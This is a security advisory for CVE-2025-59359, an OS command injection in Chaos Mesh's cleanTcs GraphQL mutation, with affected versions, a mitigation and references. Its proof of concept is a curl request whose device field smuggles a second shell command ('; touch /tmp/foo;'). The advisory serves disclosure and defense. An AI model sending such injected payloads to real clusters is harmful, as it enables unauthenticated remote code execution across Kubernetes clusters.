---
description: CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation
title: Chaos Mesh cleanTcs command injection
date_published: "2025-09-15"
last_updated: "2025-09-15"
xray_id: JFSA-2025-001449534
vul_id: CVE-2025-59359
cvss: 9.8
severity: critical
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

OS command injection in Chaos Mesh via the cleanTcs mutation

## Component

github.com/chaos-mesh/chaos-mesh

## Affected versions

(,2.7.2]

## Description

The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.

## PoC

```shell
curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
    "variables": {
      "namespace": "kube-system",
      "podName": "coredns-5dd5756b68-779rm",
      "devices": ["eth0 root; touch /tmp/foo; "]
    }
  }'

```

## Vulnerability Mitigations

If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:

```shell
helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
```



## References

[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)

[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)

